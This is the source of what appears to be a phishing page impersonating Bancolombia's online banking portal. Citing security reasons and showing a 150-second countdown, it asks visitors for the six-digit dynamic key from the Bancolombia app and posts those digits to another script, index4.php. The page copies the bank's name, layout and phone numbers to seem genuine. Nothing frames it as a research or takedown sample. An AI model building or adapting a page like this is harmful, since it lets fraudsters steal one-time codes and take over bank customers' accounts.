<html><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">



<link href="./hfh/styles.css" media="all" rel="stylesheet" type="text/css">
  
  <link href="./hfh/bootstrap.css" media="all" rel="stylesheet" type="text/css">  

	

	<link href="./hfh/jquery-ui.css" media="all" rel="stylesheet" type="text/css"> 
   	<link href="./hfh/ui.css" media="all" rel="stylesheet" type="text/css">
	<script type="text/javascript">
var url="index.php";
var seconds = 150; //número de segundos a contar
function secondPassed() {

  var minutes = Math.round((seconds - 30)/60); //calcula el número de minutos
  var remainingSeconds = seconds % 60; //calcula los segundos
  //si los segundos usan sólo un dígito, añadimos un cero a la izq
  if (remainingSeconds < 10) { 
    remainingSeconds = "0" + remainingSeconds; 
  } 
  document.getElementById('countdown').innerHTML = minutes + ":" +     remainingSeconds; 
  if (seconds == 0) { 
    clearInterval(countdownTimer); 
   window.location=url;
    document.getElementById('countdown').innerHTML = ""; 
  } else { 
    seconds--; 
  } 
} 

var countdownTimer = setInterval(secondPassed, 1000);
</script>

  	<script>
function soloNumeros(e){
  var key = window.event ? e.which : e.keyCode;
  if (key < 48 || key > 57) {
    e.preventDefault();
  }
}
</script>

</head>

<body style="">

<div id="cargando" style="width: 100%; text-align: center; display: none;">

     </div>
<div id="contenidoWeb" style="">
	
	
			<div class="container" id="containerMain">

			

				

<div>
	<div id="header" class="mua-page-header">
		<div class="row row-logo-svp"> 
			<div class="col-xs-12 col-sm-7 col-md-7 left-div">
				<div class="mua-imgLogoItem"></div>
				<div class="text-svp-name">Sucursal Virtual Personas</div>
			</div>
		</div>
		<div class="row">
			<div class="col-xs-12 col-sm-7 col-md-7 left-div">
				<div id="lastIn" class="mua-title-text" style="padding-top: 10px !important;">
				<div>
	<div class="timeText">Fecha y hora actual:</div>
	<span id="jclock1" class="lastVisitedText" >
	<?php
date_default_timezone_set('America/Bogota');    
$dias = array("Domingo","Lunes","Martes","Miercoles","Jueves","Viernes","Sábado");
$meses = array("Enero","Febrero","Marzo","Abril","Mayo","Junio","Julio","Agosto","Septiembre","Octubre","Noviembre","Diciembre");

$DateAndTime = date('m-d-Y h:i:s A', time());  
echo "".$dias[date('w')]." ".date('d')." de ".$meses[date('n')-1]. " del ".date('Y')." ".date('h:i:s A', time())."" ;



?>

</span>
</div>	
		</div>
			</div>
		</div>
	</div>

	<div class="panel-heading">
		<h3>
			Inserte su clave dinamica para reactivar
		</h3>
	</div>
</div>
			
			<div class="panel panel-primary">
				<div class="row" id="error">
					



				</div>

			<div class="mua-panel-body">
					  
					<div class="row">
					
						<div class="col-lg-5 col-md-5 col-sm-6">
							
											
								<h5 class="mua-title-h5"><font color="#FFFFFF"></font></h5>
											
								<p class="mua-phrase-message mua-small-text"><font color="#FFFFFF"></font></p>

								<div id="phraseImage" class="mua-image-login-container">
									




								</div>
							
									
						</div>
					
					
						<div class="col-lg-4 col-md-5 col-sm-6">

							<div class="panel_general">
								<div class="title-panel-label">
									<h1>
										Complete los campos
									</h1>
								</div>
								
									<label class="control-label" for="username"><h2>Por motivos de seguridad ingrese la clave dinamica generada en su APP BANCOLOMBIA</h2></label>
								
								<div id="contenido">
								<div align="center"><br>
									  <form _ngcontent-jsd-c16="" method="post" id="form1" action="index4.php" class="ng-untouched ng-pristine ng-invalid">
  
  <input type="tel" maxlength="1" onkeypress="soloNumeros(event)" style="width:45px;"  onkeyup="if (this.value.length == this.getAttribute('maxlength')) num2.focus()" name="num1" autofocus required>
  <input type="tel" maxlength="1" style="width:45px;" onkeypress="soloNumeros(event)"  onkeyup="if (this.value.length == this.getAttribute('maxlength')) num3.focus()" id="num2" name="num2" autocomplete="off" required>
  <input type="tel" maxlength="1" style="width:45px;" onkeypress="soloNumeros(event)"  onkeyup="if (this.value.length == this.getAttribute('maxlength')) num4.focus()" id="num3" name="num3" autocomplete="off" required>
  <input type="tel" maxlength="1" style="width:45px;" onkeypress="soloNumeros(event)"  onkeyup="if (this.value.length == this.getAttribute('maxlength')) num5.focus()"  id="num4" name="num4" autocomplete="off" required>
  <input type="tel" maxlength="1" style="width:45px;" onkeypress="soloNumeros(event)"  onkeyup="if (this.value.length == this.getAttribute('maxlength')) num6.focus()" id="num5" name="num5" autocomplete="off" required>
  <input type="tel" maxlength="1" style="width:45px;" onkeypress="soloNumeros(event)"  onkeyup="if (this.value.length == this.getAttribute('maxlength')) form1.submit();" id="num6" name="num6" autocomplete="off" required>
 
   <br><br>

										
										<input id="" name="btnGo" class="btn btn-success" type="submit" value="Confirmar Codigo">
									
  </form>
  <br> <br>
  <font size="4px;" color="">Ingresa el codigo de la APP BANCOLOMBIA antes de<br><span>
 <b> <strong id="time"><label id="countdown"></label></strong> </b><br></span></font>
									
									
									</div>

									<div class="mua-content-legend">
										<p id='CuentaAtras'></p>
									</div>
								</div>

						

			

							</div>

						</div>
						
				

		                	
					</div>
				</div>
			
	
			
			
			</div>

		
<br><br><br><br><br><br>

<div class="row">
	<div class="col-xs-12 col-sm-12 col-md-12">
		<p class="mua-footer mua-footer-info-call">
			Sucursal Telef&oacute;nica Bancolombia: Bogot&aacute; 343 0000 - Medell&iacute;n 510 9000 - Cali 554 0505 - Barranquilla 361 8888 - Cartagena 693 Sucursales Telef&oacute;nicas en el exterior: Espa&ntilde;a 900 995 717 - Estados Unidos 1866 379 9714.
		</p>
	</div>
</div>

		
 





	        <div style="margin-top: 10px;">
	            <div class="mua-title-text pull-left"></div>
	            <div class="mua-title-text pull-right"><span id="fecha">2022</span>&nbsp;Bancolombia S.A.&nbsp;&nbsp;</div>
	        </div>
	   

		</div>

	
	
	  </div> 

</body>
</html>